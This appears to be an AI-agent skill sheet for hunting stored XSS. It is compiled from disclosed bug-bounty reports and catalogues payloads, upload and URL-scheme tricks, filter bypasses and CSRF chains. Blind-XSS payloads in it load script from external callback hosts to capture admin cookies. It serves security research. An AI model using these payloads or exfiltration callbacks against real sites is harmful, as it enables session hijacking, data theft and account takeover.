---
name: hunter-l3-stored-xss
description: "Use when hunting Stored XSS on a target. Loads the L3 technique sheet: Stored XSS is attacker-controlled input persisted server-side and executed in another user's browser when that data is rendered."
domain: cybersecurity
subdomain: web
tags:
- web
- stored-xss
- hunting
- l3
version: '1.0'
---

# Stored XSS — Technique Sheet

## Overview
Stored XSS is attacker-controlled input persisted server-side and executed in another user's browser when that data is rendered. It pays highest where the renderer is a privileged context — admin panels, support backends, internal tools, notification emails — because a single stored payload fires in a high-value session. The dominant winning shapes in these records are: plain-text fields stored unescaped (names, titles, descriptions, settings values), file uploads rendered as HTML/SVG or with metadata, `javascript:`/`data:`/`vbscript:` URLs stored as links, and blind XSS payloads seeded into fields only admins/agents view. Fields with client-side-only validation (maxlength) and APIs that bypass UI validation (extraData, GraphQL mutations) are recurring bypass routes.

## Distinct sub-patterns

### 1. Unsanitized plain-text field → classic attribute/element breakout
- **Shape/param:** Nearly any user-editable text field rendered without output encoding: profile names (`POST /login/` name,last_name → `/profile`, DoD id=1072616), class title (`POST /coach/roster/` Khan Academy id=111763), goal Title (`GET /dashboard#/followergoal`, Logitech id=1049012), module name (Stripo id=1126433), banner description (Stripo id=1065964), plan name (Acronis id=1064095), promo code (`GET /ADMIN/store/index.cfm?fa=disprocode`, Acronis id=1164853), forum nickname (`GET /search`, Acronis id=1161241), profile City (`GET /forum/view_profile.php?UID={num}`, Acronis id=1122513), forum signature (id=1084183), account name (Algolia id=102755), review content (`POST /restaurant/review`, id=114631), event description (`POST /index.php/ccm/calendar/dialogs/event/add/save`, Concrete CMS id=1102018), draft product name in timeline (`POST /drafts/{id}/timeline`, Shopify id=117449), product/collection description via rich text editor (`POST /admin/products`, Shopify id=1147433).
- **Payloads (verbatim):**
  - `"><img src=x onerror=alert()>` (Logitech)
  - `"><img src=x onerror=prompt(0);>` (Khan Academy)
  - `<video><source onerror="javascript:alert(document.domain)">` (Acronis plan name — survives reload, fires on Stop/Confirm dialog)
  - `<h1 onmouseover=alert(document.domain)>XSS</h1>` (Acronis promo code)
  - `<script>alert(0)</script>` (Acronis nickname)
  - `"><div onmouseover="alert('XSS');">Hello :)` (Stripo module name)
  - `<IMG SRC=X ONERROR=ALERT(1)>` (DoD — mixed case matters when filters are case-sensitive)
  - `1234567"><img src=a onerror=alert(1)>` (Shopify Email phone field id=1033882 — numeric-looking field)
  - `<xss onmouseover="alert(1)">test</xss>` (Acronis signature id=1084183 — custom tag, no filter)
- **Root cause:** Input stored raw; rendered without HTML-encoding or with attribute quoting that `">` breaks out of.
- **Impact:** alert/confirm/PoC across victim browsers; escalations to cookie theft (id=1122513), admin session takeover → `DELETE /api/v6/site/everything` site deletion (Logitech id=1049012), session hijacking (DoD id=1072616).
- **Exemplars:** 1049012, 1102018.

### 2. Blind XSS in admin/support/internal backends
- **Shape/param:** Any field an admin or support agent later views: registration Company field (`POST /registration.html` → admin `/phnx/driver.aspx?...TargetUser={num}`, Informatica id=1011888), profile first_name/last_name/company_name/title (`GET /profile`, DoD id=1110243), backend form inputs (DoD id=1051369), uploaded **filename** (`POST /upload_file`, CS Money id=1015355 — filename itself stored into support chat), custom fields (HackerOne id=1173040), internal Parquet Viewer cell values (Shopify id=1103298).
- **Payloads:** `"><script src=https://monty.xss.ht></script>` (Informatica); `data: "><img src="https://hemantsolo.xss.ht>/index.html?c=hemantsolo_xss" />` (DoD). XSS Hunter-style exfil payloads; CS Money used `String['fromCharCode'](104,116,...)` to obfuscate the exfil URL against naive filters.
- **Root cause:** Stored payload fires in a second, privileged context the attacker never sees — hence blind payloads with callback servers (xss.ht, XSSHunter).
- **Impact:** Stolen admin session cookies (`wm-*` at Informatica), admin IP/UA, backend service info, DB credentials (id=1051369), Mailchimp customer titles + internal subscription emails (id=1110243), employee IP/UA + `file://` page URL inside Shopify's internal tool (id=1103298). CS Money: support staff affected **without clicking anything**.
- **Exemplars:** 1011888, 1110243.

### 3. File upload → stored XSS (content-type/extension abuse)
- **Shape/param:** Any upload endpoint; abuse the file *served*, not the input:
  - SVG rendered inline: upload SVG with `onload=` handler to Slack, served as `image/svg+xml` on slack-files.com without restrictive CSP (id=100565). Payload: `<svg ... onload="alert('script')"><script type="text/javascript"><![CDATA[ ... ]]></script>...</svg>`
  - Avatar with tampered MIME: PNG with `exiftool -Comment=""><script>alert(prompt('XSS BY ZEROX4'))</script>"` in metadata, upload intercepted and `Content-Type` changed `image/png` → `text/html`; executed from shopify-assets.shopifycdn.com (Shopify id=964550).
  - Direct HTML upload: restaurant menu upload accepts HTML files, served to other users (Uber id=1005355); `.html` upload served from `/jppso/vendor/Data/` (DoD id=1081994).
- **Root cause:** Server stores attacker bytes and serves them from a session domain with `text/html` or `image/svg+xml` content type and no CSP.
- **Impact:** Script execution on main/CDN domains → data theft, phishing (fake sign-in form in Slack SVG), account takeover.
- **Exemplars:** 964550, 100565.

### 4. `javascript:` / `data:` / `vbscript:` URL schemes stored as link targets
- **Shape/param:** Any field saved as a URL and later emitted into an `href`:
  - fulfillment tracking URL `POST /admin/orders/{id}/fulfillments/{id}` `javascript:alert(1);//` (Shopify id=106897)
  - cart artwork property `POST /cart/add` `properties[Artwork file]` = `javascript:alert(document.domain) //http://google.com/uploads/pwned.jpg` (Shopify id=106636 — trailing comment mimics a filename)
  - markdown links: `[clickme](vbscript:alert(document.domain))` in GitLab issue notes, IE-only (id=118024); `[Click here](javascript:alert(document.domain))` and `[click this link](data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K)` in Slack help comments (id=116419)
  - Poll block "Redirect address" = `javascript:alert(document.cookie)` (Automattic id=1050733)
  - markdown editor link href = `javascript:alert(1)` (Nextcloud text editor id=1023784, CVE-2020-8294 — IE only, CSP blocks modern browsers)
  - ad click_url `javascript://%0a%0dalert(document.cookie)` (mopub id=100931 — newline scheme trick pastes filters)
- **Root cause:** Scheme allow-list missing; click is the trigger, so no HTML injection needed.
- **Impact:** XSS on click from admins (tracking number link) or on workflow actions (poll submit).
- **Exemplars:** 106897, 1050733.

### 5. Markdown/rich-text renderer gaps (event handlers, context breakouts, generator bugs)
- **Shape/param:** Markdown-rendered content fields:
  - comment images with `onload` (Automattic intensedebate id=1039750): `<img src=".../a-addblog.png" onload="alert()">`
  - Custom Style name breaking out of `noscript`/title context (id=1054526): `<noscript><p title= "</noscript><img src=x onerror=alert(document.cookie)>">`
  - "Jump to"/"Document" links built from user's blog URL and inserted via `document.write()` (id=1083734): `http://████.herokuapp.com/"onmousemove=console.log(\`Happy-hack!\`);>.html`
  - markdown autolink of `_www.attacker.com/malicious.exe_` → `<a href="http://www.attacker.com/malicious.exe">` (Gratipay id=116512)
  - RDoc generator (Ruby id=1187156): `[onmouseover](http://"/onmouseover="alert\`on_mouse_link\`")` — href/text interpolated unescaped, javascript: scheme allowed
  - Mermaid directive (GitLab id=1103258): `%%{init: { 'fontFamily': '"></style><img src=x onerror=alert(document.cookie)>'} }%%` — Mermaid injects directive values into a style tag via innerHTML
- **Root cause:** Renderer allow-lists tags but not attributes/events, escapes in the wrong context, or `document.write()`s raw URLs.
- **Exemplars:** 1054526, 1103258.

### 6. Attribute injection via values built into tags server-side
- **Shape/param:** Server composes an attribute from user data without escaping: GitLab wiki `author_url` built from attacker-controlled **git commit email** (id=1087061): git config `user.email` = `"#' style=animation-name:blinking-dot onanimationstart=alert(document.domain) other"` → emitted with `.html_safe` inside `<a>`. Also ownCloud first/last name breaking out of an iframe tag attribute via unescaped quotes (id=116254); DuckDuckGo rendering third-party site HTML into results (id=1110229: `urban dictionary "><img src=x<`).
- **Root cause:** Unescaped interpolation into HTML (`html_safe`), even when the field looks "safe" (an email).
- **Impact:** alert(document.domain) for any viewer of the wiki page.
- **Exemplars:** 1087061, 1110229.

### 7. Validation bypass routes (API layer, extraData, client-side limits)
- **Shapes:**
  - Rocket.Chat `Meteor.call('createChannel', 'valid-name', [], false, {}, { name: 'edit me <img src onerror=alert(origin)>' })` — `extraData` merged into room object bypassing name validation; toastr renders the API error message without escapeHtml (id=1132202). Escalation: admin takeover → incoming-webhook script → RCE, full DB access.
  - DoD username field: remove client-side `maxlength=20` via inspect element, store `"><img src onerror=confirm(document.cookie)>`, then **login CSRF** forces the victim into the attacker's account so the stored payload fires (id=1092678).
  - GraphQL `productUpdate` mutation stores XSS description rendered on handshake-web-internal.shopifycloud.com shared domain (Shopify id=1085546).
  - TweetDeck group name: 9-char limit bypassed by **splitting the payload across multiple group names**; `<script>alert(1);//` fires when rendered (id=119022).
  - Concrete CMS: event created via CSRF (no `ccm_token` check) containing the XSS description (id=1102018).
  - CS Money: filename upload with no CSRF token/origin validation (id=1010466).
- **Root cause:** UI-enforced constraints not re-checked server-side; unsafe library rendering of API errors.
- **Exemplars:** 1132202, 1092678.

### 8. Cross-context delivery: emails and notifications
- **Shape/param:** Profile "full name" (edited post-registration — filtering only exists at signup) injected unescaped into the subject/body of a "has just followed you" email (id=114879): `<img Src="http://goo.gl/JPx2sV" onload=alert("PENTEST")>%20%20> "<iframe Src=a>%20<iframe>`. Store contact email `luc1d"><img/src="x"onerror=alert(document.domain)>@wearehackerone.com` propagates into apps.shopify.com support page (id=1107726); currency formatting setting propagates into Pinterest/Twitter/Buy Button/Facebook sales-channel tabs (Shopify id=104359).
- **Root cause:** Stored value rendered in a *different* surface (email HTML, second app, shared domain) that doesn't re-sanitize.
- **Exemplars:** 114879, 1107726.

### 9. Framework/DOMPurify/CSP-adjacent library bugs
- GitLab swagger-ui bundles old DOMPurify permitting arbitrary attributes; payload anchor with `data-remote="true" data-method="get" data-type="script"` in committed `openapi.yaml` → one click anywhere loads attacker JS (id=1072868).
- Mermaid directive style-tag injection (id=1103258, above).
- Angular template/expression injection: FetLife private-message Subject not sanitized against Angular expressions, executes on recipient (id=1095934, payload not stated).
- Dangling-markup + `<base target="` injection in Nextcloud Deck comments (id=2058556): `<a href=...><font size=100 color=red>You must click me</font></a><base target="`.

### 10. Third-party/vendor and specialty contexts
- Stored XSS in HackerOne's 3rd-party events vendor (id=1028332) — report vendor bugs to the program, scope permitting. TweetDeck rendering DM group names (id=119022). Zaption live-presentation "Quick question" firing on presenter AND viewers simultaneously (id=112372: `asdf"><img src=x onerror=prompt(1)>`). Slack gist **title** rendered unencoded on outpost.slack.com (id=11073: `"><svg onload=alert(1)>`).

## Bypass / chain notes
- **Content-Type tampering:** change uploaded image MIME to `text/html` in Burp so the CDN serves it as HTML (id=964550).
- **Case and tag tricks:** `<IMG SRC=X ONERROR=ALERT(1)>` (case), `<video><source onerror=...>`, `<h1 onmouseover=...>`, `<xss onmouseover=...>` (nonexistent tag), `<img/src="x"onerror=...>` (slash instead of space, id=1107726).
- **Char-limit bypasses:** split payload across multiple TweetDeck group names (id=119022); strip client-side `maxlength` via devtools (id=1092678).
- **Self-XSS → stored via CSRF:** login CSRF forces victims into the payload-bearing attacker account (id=1092678); CSRF form auto-submits the stored payload (id=106636); unauthenticated event creation (id=1102018).
- **Multi-renderer propagation:** one stored value (email, currency format, product description) firing in several downstream surfaces — test every place the value renders, including error toasts (Rocket.Chat toastr), confirmation dialogs (Acronis Stop/Confirm), and admin timelines (Shopify id=117449).
- **Blind XSS chains:** seed payload → wait for admin visit → exfil cookies/IP/UA/backend info → replay session. Use payload obfuscation (`String.fromCharCode`) where filenames/inputs are naively filtered (id=1010466).
- **One-click DOM/CSP bypasses:** `data-remote/data-method/data-type="script"` anchors under old DOMPurify (id=1072868); attribute injection via `animation-name` + `onanimationstart` (id=1087061) — no `<script>` tag needed.

## Gotchas / what NOT to do
- Payloads that fire only in IE (vbscript:, javascript: in markdown on IE, Nextcloud CVE-2020-8294) may be rejected or low-severity on modern-browser-only programs — check the CSP/browser policy first; GitLab's CSP blocked the Mermaid payload on gitlab.com even though it worked self-hosted (id=1103258).
- Payloads needing interaction (click, hover, mouseover) are weaker than onload/onerror — but interaction-based (javascript: URL) XSS is still accepted when the victim is an admin (id=106897).
- Don't assume validation you saw in the UI exists server-side: maxlength, name-format checks, and MIME checks were all bypassable in these records.
- Self-XSS alone (Nextcloud Deck id=2058556) needs a CSRF/login-CSRF chain to be impactful — demonstrate the chain, not just the alert.
- Don't test blind XSS without a callback server you control; the whole impact case rests on captured exfil data (cookies, IP, UA).
- Don't ignore "boring" fields: phone numbers, city, currency format, email, filenames, and git commit emails all fired XSS here.

## Real-world impact examples
- Informatica (id=1011888): blind XSS in admin panel leaked admin session cookies, admin IP, backend info, and other customers' names/emails.
- DoD (id=1110243): blind XSS in admin revealed admin IP, backend service, Mailchimp customer titles, internal subscription emails, and admin session cookies → admin panel takeover.
- Rocket.Chat (id=1132202): stored XSS → admin takeover → RCE via incoming webhook script, full DB read/write/delete, server control.
- Logitech (id=1049012): stored XSS in shared-access flow escalated to complete deletion of the victim's site via `DELETE /api/v6/site/everything`.
- Shopify (id=1103298): blind XSS inside an internal employee tool captured employee IP, user-agent, and the `file://` page URL.
- DoD (id=1051369): stored XSS in admin backend exfiltrated administrator session cookies and database credentials.